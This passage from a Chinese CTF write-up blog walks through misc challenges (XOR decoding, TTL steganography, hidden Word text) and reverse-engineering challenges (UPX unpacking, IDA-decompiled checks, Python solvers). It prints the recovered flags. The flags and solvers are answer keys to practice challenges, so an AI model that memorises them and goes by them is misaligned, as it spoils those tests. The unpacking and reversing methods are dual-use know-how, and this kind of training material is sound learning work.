class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后解压出真实的压缩包，图片为高度隐写</p><p><img src="/2021/05/28/CTF/image-20210804214154795.png" alt></p><p>然后将亦真亦假文件与字符5进行异或，下面是脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'亦真亦假'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>data1 <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">5</span>    data1 <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后新建一个空白文件，将上面得出来的结果复制进去就行了</p><p><img src="/2021/05/28/CTF/image-20210804222354932.png" alt></p><p>然后发现是word应该，后缀名改为doc，颜色隐藏文本</p><p><img src="/2021/05/28/CTF/image-20210804222507880.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">FLAG&#123;_th2_7ru8_2iP_&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="给出字串"><a href="#给出字串" class="headerlink" title="给出字串"></a>给出字串</h2><blockquote><p>misc中常见给出字串让转为文件或者其他什么东西的题型，就是给你一串或长或短的数字，让你解一下这段内容，转换一下获得文件或者明文。</p></blockquote><h3 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h3><blockquote><p>​    IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。<br>​    如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</p></blockquote><h4 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h4><p>给出的文件的内容只有<code>63 127 191 255</code>四个数字，此时考虑ttl隐写。</p><p><code>00 替换 63 01 替换 127 10 替换 191 11 替换 255</code></p><p>写出脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attachment.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'63\n'</span><span class="token punctuation">,</span> <span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'127\n'</span><span class="token punctuation">,</span> <span class="token string">'01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'191\n'</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'255\n'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    再将文件内的内容复制粘贴到winhex里面，然后似乎文件头没有<code>50</code>不知道是不是我个人的问题。</p><p>​    然后zip伪加密，务必使用010editor，看起来zip伪加密更清晰一点。</p><p>​    里面又是base家族的多重加密，使用我个人开发的专属解题脚本解出flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210804233925939.png" alt></p><h2 id="含逆向的misc"><a href="#含逆向的misc" class="headerlink" title="含逆向的misc"></a>含逆向的misc</h2><h3 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h3><p>这题很简单，直接改计算机的系统时间即可</p><p><img src="/2021/05/28/CTF/image-20200917204620215.png" alt></p><p><img src="/2021/05/28/CTF/image-20200917204556945.png" alt></p><pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;We1cOm3_70_cyber_security&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="方向介绍与解题思路"><a href="#方向介绍与解题思路" class="headerlink" title="方向介绍与解题思路"></a>方向介绍与解题思路</h2><h3 id="方向的简单介绍"><a href="#方向的简单介绍" class="headerlink" title="方向的简单介绍"></a>方向的简单介绍</h3><p>reverse方向在实战中表现为计算机软件破解，有一般的c与c++作为反编译内容的破解、有基于c#的软件的破解、有基于java的逆向破解等等。</p><p>而在CTF中，reverse的出题模式一般有下面的几种</p><h3 id="一般的逆向题"><a href="#一般的逆向题" class="headerlink" title="一般的逆向题"></a>一般的逆向题</h3><h3 id="一般的迷宫题"><a href="#一般的迷宫题" class="headerlink" title="一般的迷宫题"></a>一般的迷宫题</h3><h2 id="一般逆向-啥都没有，简单的算法"><a href="#一般逆向-啥都没有，简单的算法" class="headerlink" title="一般逆向(啥都没有，简单的算法)"></a>一般逆向(啥都没有，简单的算法)</h2><h3 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h3><p>先查pe，注意到是UPX壳，直接拉到虚拟机内脱壳</p><p><img src="/2021/05/28/CTF/image-20210531101308798.png" alt="image-20210531101308798"></p><p>然后直接拖入ida32，跟踪到如下的主要代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+12h] [ebp-2Eh] BYREF</span>  _DWORD v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-22h]</span>  _BYTE v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Ah] [ebp-16h] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Fh] [ebp-11h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+33h] [ebp-Dh]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+37h] [ebp-9h]</span>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-5h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-4h]</span>  <span class="token function">sub_401A10</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"*F'\"N,\"(I?+@"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">65</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">67</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">84</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">70</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">123</span> <span class="token operator">||</span> v10 <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_402000<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一看就是简单的古典密码而已，直接脚本出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"*F'\"N,\"(I?+@"</span>dic <span class="token operator">=</span> <span class="token string">r"&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=&lt;;:9876543210/.-,+*)("</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;%$# !\""</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> dic<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;U9X_1S_W6@T?&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="buu、Youngter-drive"><a href="#buu、Youngter-drive" class="headerlink" title="buu、Youngter-drive"></a>buu、Youngter-drive</h3><p>首先给的是exe文件就先验验壳，UPX壳，直接脱了。</p><p>或者使用OD手工脱了，<a href="https://blog.csdn.net/kevin66654/article/details/79135861">关于OD的手工脱壳的教程</a>。</p><p>然后拉入ida32简单分析。注意到创建了两个单独的线程来进行加密，两个线程的函数分别为<code>StartAddress</code>、<code>sub_41119F</code>。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    HANDLE v4<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14h]</span>    HANDLE hObject<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-8h]</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sub_4110FF<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">::</span>hObject <span class="token operator">=</span> <span class="token function">CreateMutexW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">j_strcpy</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Source<span class="token punctuation">)</span><span class="token punctuation">;</span>        hObject <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> StartAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sub_41119F<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_418008 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">;</span>    <span class="token function">sub_411190</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token operator">::</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然创建了两个线程，但是第二线程似乎只是为了Sleep而创建的，所以只有<code>StartAddress</code>函数是具有功能的。深入跟进该函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// positive sp value has been detected, the output may be wrong!</span><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_411940</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+D3h] [ebp-5h]</span>    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">65</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然最上面提示了堆栈不平衡，但是ida7.5依然分析出了该功能的c代码。上面的a2对应的就是那个一直在自减一的<code>dword_418008</code>，表示字符串的窗口挪动？而后面的那个线程似乎只做了字符串窗口移动的动作。这个应该是一个从后向前推导的过程，但是简单分析了一下，这样似乎不行，看了别人的wp，发现应该是后面还有一位的，这里进行验证的是29位，但是其实进行加密的是30位，这样就满足了，由此得出逆向的python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">''</span>off_418000 <span class="token operator">=</span> <span class="token string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>off_418004 <span class="token operator">=</span> <span class="token string">'TOiZiZtOrYaToUwPnToBsOaOapsySy'</span>  <span class="token comment"># 在从ida得来的字符串的最后加上一位(随意的字符)，经测试，只有在第三十位字符是y的情况下得出的flag才是正确的</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>off_418004<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">continue</span>    tmp <span class="token operator">=</span> off_418000<span class="token punctuation">.</span>index<span class="token punctuation">(</span>off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 用tmp的值代表检验字符串在加密表字符串的位置(下标)</span>    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># ThisisthreadofwindowshahaIsESE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一位是y时得到的flag才是正确的。。。</p><p>另外加密的时候<code>*(_BYTE *)(a2 + a1)</code>代表的是地址，所以后面的<code>*(char *)(a2 + a1)</code>应该也是地址类似的东西，在数组里面也只有下标了，总之这道题做得挺蒙的。。。</p><h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p><strong>TAG:换表base64、大小写互相转换</strong></p><p>查壳无壳</p><p><img src="/2021/05/28/CTF/image-20210607180229271.png" alt></p><p>直接先使用ida32打开看一看</p><p><img src="/2021/05/28/CTF/image-20210607180359872.png" alt></p><p>找到关键的字符串，一路跟踪进去发现关键函数，内容如下(其实就是逆出来的main函数)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-74h] BYREF</span>  __int16 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-68h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+16h] [ebp-66h]</span>  <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-64h] BYREF</span>  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_40E140<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_401080</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">==</span> byte_40E0E4<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aError<span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_6<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token 